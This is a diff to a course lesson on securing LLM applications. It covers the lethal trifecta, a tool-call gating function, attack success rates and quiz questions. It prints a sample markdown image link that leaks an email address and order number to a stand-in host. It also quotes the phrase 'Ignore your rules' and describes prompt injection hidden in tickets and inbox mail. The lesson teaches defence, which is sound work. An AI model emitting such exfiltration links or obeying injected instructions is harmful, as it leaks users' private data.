@@ -2,7 +2,7 @@
 title: Securing AI applications
 summary: How LLM apps are built, why instructions and data mix, the lethal trifecta in real incidents, and the architectural defences that hold, measured properly.
 month: 18
-minutes: 60
+minutes: 85
 builds: a threat model of an AI app, and a defence plan
 source: OWASP GenAI Security Project | https://genai.owasp.org/
 words: RAG, system prompt, tool calling
@@ -62,6 +62,20 @@ For any AI feature, answer the [trifecta](/guides/d2-llm-security-primer/) quest
 
 If all three are present, you've got a serious design problem, and no prompt will fix it. Don't forget quiet exits: a model that outputs a markdown image makes the browser fetch a URL, and that URL can carry data.
 
+The three questions can be asked of every tool the feature has. If one tool reads private data, another reads untrusted content, and a third can send data out, the feature as a whole has the trifecta, even though no single tool looks dangerous.
+
+@code trifecta-check
+
+The quiet exit deserves a closer look. Suppose a model's answer contains this line:
+
+```
+![status](https://collector.example/pixel.png?d=ana%40example.com%2C+order+4471)
+```
+
+The user sees a broken image, or nothing. The browser, meanwhile, has requested that address, and the part after `?d=` carries an email address and an order number to whoever runs `collector.example`. Nobody clicked anything. The defence sits in your rendering code: allow images and links only from hosts you trust, and drop the rest before the answer reaches the page.
+
+@code exfil-links
+
 @drill trifecta
 
 ?? A support bot reads tickets from the public and can query all customer records. What's the strongest fix?
@@ -83,6 +97,22 @@ If all three are present, you've got a serious design problem, and no prompt wil
 
 Notice that none of these depend on the model behaving. **Guardrails** help as an extra layer, but anything that filters text can be bypassed by rewording. Assume the model will be fooled, and limit what happens next.
 
+The second and third points come down to one function that sits between the model and your systems. The model proposes a call, and the function decides using facts the model can't change: who the user is, what they own, and which tools exist.
+
+```python
+def gate(call, user):
+    if call["tool"] == "get_order":
+        order = orders.get(call["args"]["order_id"])
+        return "allow" if order and order["owner"] == user else "deny"
+    if call["tool"] == "send_email":
+        return "needs approval"
+    return "deny"
+```
+
+An unknown tool is refused, not passed through. Reading an order is allowed only for its owner, whatever the conversation says. Sending email always waits for a person.
+
+@code tool-gate
+
 @drill llm-risk
 
 ?? Which control still works even if an attacker fully controls the model's output?
@@ -101,6 +131,18 @@ An assistant sent an email nobody asked for. Find out what happened from its log
 ## Measure, don't hope
 
 Models are non-deterministic. Treat this like testing: define the test cases, run each many times on your own app, and report rates before and after a change. Tools such as [promptfoo](https://www.promptfoo.dev/) put this in CI. Remember the roadmap's rule: a finding isn't a finding until it reproduces.
+
+A results table makes the change visible. Run each attack case, say, 20 times before a fix and 20 times after:
+
+| Case | Before | After |
+|---|---|---|
+| Hidden instruction in a ticket | 9 of 20 | 0 of 20 |
+| Markdown image with data | 14 of 20 | 0 of 20 |
+| "Ignore your rules" typed directly | 2 of 20 | 1 of 20 |
+
+The third row hasn't reached zero, and the report should say so rather than round it away. One success in 20 still means it will happen in production.
+
+@code attack-rates
 
 ?? An attack worked once in one attempt. What should your report say?
 + Nothing final, until it repeats over many trials
@@ -125,5 +167,43 @@ Know the names: [MITRE ATLAS](https://atlas.mitre.org/), [NIST AI RMF](https://w
 ::: try Commit to a track
 At the end of this month, write your track commitment memo. See [choosing your track](/guides/c2-choosing-your-track/). Then fix a real system on the [Parrot machine](/machines/parrot/).
 :::
+
+?? Which of these can an organisation be certified against?
++ ISO/IEC 42001, the AI management system standard
+- MITRE ATLAS, the knowledge base of attacks
+- The OWASP Top 10 for LLM applications
+- The NIST AI RMF, a voluntary framework
+=> ISO/IEC 42001 is a management system standard, like ISO 27001, so an accredited body can certify against it. The others are guidance and knowledge bases.
+
+## Review an AI feature
+
+A team asks you to approve an email assistant before launch.
+
+```
+Tools:     read_inbox, search_crm (all customers), send_email (any address)
+Safety:    the system prompt says "Never send customer data outside the company."
+Display:   answers are rendered as Markdown, images included.
+```
+
+?? Which legs of the trifecta does it have?
++ All three, through its three separate tools
+- Only private data, from reading the CRM
+- None, since it is only used inside
+- Only an exit, since it sends emails
+=> The inbox brings in untrusted text, the CRM is private data, and both sending email and rendering images are ways out. That combination is the design problem.
+
+?? Why isn't the system prompt line a control?
++ Injected instructions can override text in a prompt
+- System prompts are always visible to every user
+- The model can't read prompts written in English
+- Email assistants are never allowed any system prompts
+=> A rule written in text competes with other text. Restricting `send_email` to approved recipients in code, with a person approving, holds whatever the model is told.
+
+?? What would you change about the display?
++ Allow images only from the hosts you trust
+- Render the answers as HTML instead of Markdown
+- Make every image in the answer much larger
+- Add a warning that images may load slowly
+=> A Markdown image is an outbound request that nobody approves. Drop images and links to unknown hosts before rendering.
 
 ?! Pick an AI tool you use. Answer the three trifecta questions for it. What would you change?
